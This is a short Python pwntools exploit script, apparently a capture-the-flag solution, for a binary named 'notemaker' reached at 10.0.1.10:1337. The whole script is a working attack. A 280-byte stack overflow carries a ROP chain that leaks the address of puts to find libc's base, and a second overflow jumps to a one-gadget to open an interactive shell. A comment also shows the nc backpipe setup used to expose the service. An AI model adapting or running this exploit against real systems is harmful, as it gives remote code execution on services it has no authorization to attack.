from pwn import *
elf = ELF('./notemaker', checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#nc -l 1337 0<backpipe | /sbin/notemaker 1>backpipe

payload = ''.join([
	'A'*280,
	p64(0x00000000004014eb),	# pop rdi ; ret
	p64(elf.got['puts']),
	p64(elf.plt['puts']),
	p64(elf.sym['main'])
])
p = remote("10.0.1.10", 1337)
p.sendlineafter(' >> ', payload)
libc.address  = u64(p.recvline().strip()[:8].ljust(8, '\x00')) - libc.sym['puts']
log.info("libc base @ 0x%x"% libc.address)
payload = ''.join([
	'A'*280,
	p64(libc.address + 0x4f322) # one gadget
])
p.sendlineafter(' >> ', payload)
p.interactive()